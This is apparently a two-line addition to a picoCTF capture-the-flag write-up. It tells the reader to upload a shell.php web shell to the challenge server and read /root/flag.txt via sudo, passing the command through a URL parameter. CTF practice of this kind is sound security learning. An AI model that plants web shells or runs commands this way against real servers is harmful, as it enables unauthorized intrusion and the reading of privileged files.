@@ -1,0 +1,2 @@
+Upload the shell.php file to the server and execute the command:
+http://standard-pizzas.picoctf.net:63884/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt
